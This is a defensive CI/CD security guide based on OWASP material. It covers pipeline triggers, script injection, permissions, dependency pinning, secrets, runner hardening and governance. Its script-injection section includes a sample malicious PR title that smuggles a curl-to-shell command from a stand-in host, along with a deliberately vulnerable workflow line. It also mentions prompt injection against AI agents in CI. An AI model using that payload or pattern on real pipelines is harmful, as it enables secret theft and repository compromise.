# CI/CD security guide: how to verify and fix each concept

Sources: OWASP CI/CD Security Cheat Sheet, OWASP GitHub Actions Security Cheat Sheet, OWASP Top 10 CI/CD
Security Risks. Platform-neutral: every CI system has **triggers** (who can start a run), **code** (what runs),
**identity** (what the run can access), **dependencies** (what it pulls in), **outputs** (artifacts, caches,
deployments) and **governance** (who can change all of the above).

Treat the pipeline as production code: it holds the keys to production.

---

## Triggers and untrusted code (CICD-TRIG-*)

The core rule: **untrusted code must never run where secrets or write tokens are available.**

- GitHub `pull_request_target` and `workflow_run` run with the base repository's secrets and a write token.
  Checking out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`) and then running its build,
  tests, or install scripts gives the PR author those secrets. Use `pull_request` (no secrets for forks) for
  building PR code; use `workflow_call` instead of `workflow_run` for chaining.
- Comment/label triggers (`/deploy`, `ok-to-test`): verify the actor's permission (author association or
  API permission check), and bind to an exact SHA (`/ok-to-test <sha>`). A label applied once is not approval
  for later pushes. Check out `head.sha`, never a branch name (TOCTOU).
- Equivalents elsewhere: GitLab pipelines for fork merge requests running in the parent project, Jenkins
  multibranch building untrusted PRs with credentials bound.

## Script injection (CICD-INJ-001)

`${{ … }}` expressions are substituted into the script text *before* the shell runs. A PR titled
`"; curl evil.sh | sh; #` executes. Same for Groovy `"${params.X}"` in Jenkins.

```yaml
# vulnerable
- run: echo "${{ github.event.issue.title }}"
# fixed: the value arrives as data in an environment variable
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```
Untrusted contexts include issue/PR/comment/review titles and bodies, branch names (`head_ref`), commit
messages and author names, page names, and `workflow_dispatch` inputs from less-trusted users.

## Permissions and identity (CICD-PERM-*)

- GitHub: set `permissions: {}` (or `contents: read`) at the workflow top; grant `contents: write`,
  `id-token: write`, `packages: write` only on the jobs that need them. Set the repository default token to
  read-only.
- Replace long-lived cloud keys with OIDC federation (`id-token: write` + `role-to-assume` /
  workload identity federation), with trust policies restricted to the repository, branch/tag and environment.
- Least privilege per pipeline; do not share credentials between pipelines of different sensitivity.

## Third-party code (CICD-DEP-*)

- Pin actions and reusable workflows to a full 40-character commit SHA (with the tag as a comment), images to
  `@sha256:` digests, orbs/plugins to exact versions. Tags can be moved; the tj-actions/changed-files
  compromise pushed malicious code to existing tags.
- Watch for impostor commits: a SHA that belongs to a fork, not the named repository.
- Keep pins fresh with Dependabot/Renovate for `github-actions`, with a cooldown (`cooldown` /
  `minimumReleaseAge`) so brand-new releases are not adopted instantly.
- Install dependencies from lockfiles with integrity checks (`npm ci`, `yarn --immutable`,
  `pnpm --frozen-lockfile`, `pip --require-hashes`, `bundle --frozen`). Use scoped/private registries to
  prevent dependency confusion; commit the package-manager config (`.npmrc` without tokens).

## Secrets (CICD-SECRET-*)

Never inline secrets in pipeline files. Take them from the platform secret store or a secrets manager. Pass
them to the step that needs them (not the whole job), prefer environment-scoped secrets, replace
`secrets: inherit` with explicit passing, never `echo`/`cat` them, avoid `set -x`/`printenv`, mask derived
sensitive values (`::add-mask::`), and use `persist-credentials: false` on checkout unless later steps push.

## Execution environment (CICD-RUN-*)

- Self-hosted runners: never for public repositories (any fork PR can run code on your network); ephemeral
  (one job then destroyed); no stored credentials; segmented network; separate runner groups by privilege.
- No `--privileged`, no Docker socket mounts, no `docker:dind` unless isolated; do not run as root.
- No `curl … | sh`: download, verify a checksum or signature, then execute.
- Restrict or monitor egress (e.g. Harden-Runner) so a compromised step cannot exfiltrate secrets.

## Artifacts and caches (CICD-ART-*)

Caches and artifacts written by low-trust workflows (PR builds) can be restored by high-trust ones (release).
Disable caching in release/publish workflows, and never download artifacts from untrusted runs into them.
Sign releases and images (Sigstore/cosign), generate provenance (SLSA, in-toto) and an SBOM.

## Deployment and SCM governance (CICD-DEPLOY-*, CICD-SCM-*)

Protected environments with required reviewers for production; deploy only from protected branches/tags.
Branch protection or rulesets: required reviews (not bypassable by admins), required status checks, CODEOWNERS
on `.github/workflows/` (and other pipeline files), signed commits, no auto-merge without checks. Require
approval for workflow runs from all external contributors, not just first-time ones.

## Scanning, logging, AI (CICD-SCAN-*, CICD-LOG-*, CICD-AI-*)

Required checks: SAST, dependency review/audit, secret scanning, IaC scanning, and workflow linters (zizmor,
actionlint, CodeQL `actions`). Centralize pipeline and SCM audit logs, never logging secrets. AI agents in CI:
minimal tools and token scopes, no secrets when processing issue/PR text from untrusted users. Prompt injection
in an issue is the same as script injection.
